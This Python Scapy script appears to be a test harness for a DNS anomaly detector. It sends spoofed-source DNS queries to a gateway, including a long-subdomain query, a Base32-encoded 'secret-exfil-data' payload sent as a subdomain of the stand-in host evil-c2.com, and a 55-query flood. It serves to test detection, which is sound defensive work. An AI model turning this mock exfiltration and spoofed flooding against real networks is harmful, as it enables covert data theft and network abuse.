"""
DNS Tunneling Simulation
========================
Sends three types of suspicious DNS queries to trigger the
DnsAnomalyDetector's three detection signals:

  1. LONG_SUBDOMAIN  – one query with a 62-char Base32-like subdomain
  2. HIGH_ENTROPY    – one query with a Base32-encoded payload (high entropy)
  3. QUERY_FLOOD     – 55 rapid queries to the same domain

Run with admin privileges (Scapy needs raw socket access):
    python scripts/sim_dns_tunnel.py
"""

import base64
import time

from scapy.all import conf
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

IFACE    = conf.iface
ATTACKER = "10.0.0.88"     # fake source IP – simulates an external attacker
TARGET   = "192.168.1.1"   # gateway – forces traffic through the physical NIC
DNS_PORT = 53


def _dns_query(qname: str) -> None:
    pkt = (
        IP(src=ATTACKER, dst=TARGET)
        / UDP(sport=54321, dport=DNS_PORT)
        / DNS(rd=1, qd=DNSQR(qname=qname))
    )
    send(pkt, iface=IFACE, verbose=False)


def sim_long_subdomain() -> None:
    """Signal 1 – subdomain exceeds 50 characters."""
    print("[*] Sending LONG_SUBDOMAIN query...")
    long_label = "a" * 62
    _dns_query(f"{long_label}.evil-c2.com")
    print(f"    qname: {long_label[:20]}...evil-c2.com ({len(long_label)} chars)")


def sim_high_entropy() -> None:
    """Signal 2 – Base32-encoded payload produces high Shannon entropy."""
    print("[*] Sending HIGH_ENTROPY query...")
    payload = base64.b32encode(b"secret-exfil-data-12345").decode().lower().rstrip("=")
    _dns_query(f"{payload}.evil-c2.com")
    print(f"    qname: {payload}.evil-c2.com")


def sim_query_flood() -> None:
    """Signal 3 – 55 queries to the same domain within a few seconds."""
    print("[*] Sending QUERY_FLOOD (55 queries)...")
    for _ in range(55):
        _dns_query("flood-target.evil-c2.com")
        time.sleep(0.05)
    print("    Done – 55 queries sent to flood-target.evil-c2.com")


if __name__ == "__main__":
    print("=== DNS Tunneling Simulation ===\n")

    sim_long_subdomain()
    time.sleep(0.5)

    sim_high_entropy()
    time.sleep(0.5)

    sim_query_flood()

    print("\n[*] Simulation complete. Check SENTINEL for DNS_ANOMALY alerts.")
